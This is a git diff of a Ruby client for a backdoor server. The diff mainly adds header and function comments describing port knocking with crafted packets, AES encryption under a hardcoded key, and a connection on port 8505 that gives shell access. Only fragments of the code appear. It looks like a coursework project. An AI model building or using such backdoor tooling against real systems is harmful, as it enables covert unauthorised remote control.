@@ -1,12 +1,13 @@
 #! /usr/bin/env ruby
 =begin
 -------------------------------------------------------------------------------------
---  SOURCE FILE:    client.rb - An  
+--  SOURCE FILE:    client.rb - Client applcation for connecting to Backdoor server
+--                              server program.
 --
 --  PROGRAM:        client
 --                ./client.rb 
 --
---  FUNCTIONS:      
+--  FUNCTIONS:              Port Knocking, Crafted Packets, Encryption
 --
 --  Ruby Gems required:     packetfu
 --                          https://rubygems.org/gems/packetfu
@@ -22,7 +23,7 @@
 --
 --  PROGRAMMERS:    Chris Wood - chriswood.ca@gmail.com
 --
---  NOTES:          
+--  NOTES:          problem with client/server socket buffer. sometimes messages get overread.
 --  
 ---------------------------------------------------------------------------------------
 =end
@@ -39,6 +40,12 @@ $key = OpenSSL::Digest::SHA256.new("verysecretkey").digest
 
 ## Functions
 
+# Decrypts a received message
+#
+# @param [String] data 
+# - data to decrypt
+# @return [String]
+# - decrypted message
 def decrypt(data)
     cipher = OpenSSL::Cipher::AES256.new(:CBC)
     cipher.decrypt
@@ -54,6 +61,12 @@ def decrypt(data)
     return msg
 end
 
+# Encrypts a message for transmission
+#
+# @param [String] data 
+# - msg to encrypt
+# @return [String]
+# - encrypted payload
 def encrypt(data)
     cipher = OpenSSL::Cipher::AES256.new(:CBC)
     cipher.encrypt
@@ -69,6 +82,11 @@ def encrypt(data)
     return payload
 end
 
+# Sends a packet with an expected signature. This is the "knock" for the
+# backdoor.
+#
+# @param [String] ip 
+# - IP Address to send knock to
 def knock(ip)
     config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> @dev)).config
     p = PacketFu::TCPPacket.new(:config=> config, :flavor=> "Linux")
@@ -87,6 +105,10 @@ def knock(ip)
     puts "knock, knock, knock ......."
 end
 
+# Connects to the backdoor and establishes shell access
+#
+# @param [String] ip 
+# - IP Address to send knock to
 def comm(ip)
     begin
         s = TCPSocket.new ip, 8505
@@ -102,6 +124,9 @@ def comm(ip)
     }
 end
 
+# Client program menu. prompts for input to guide to
+# correct functions.
+#
 def menu
     puts "welcome to hacky hack program"
     
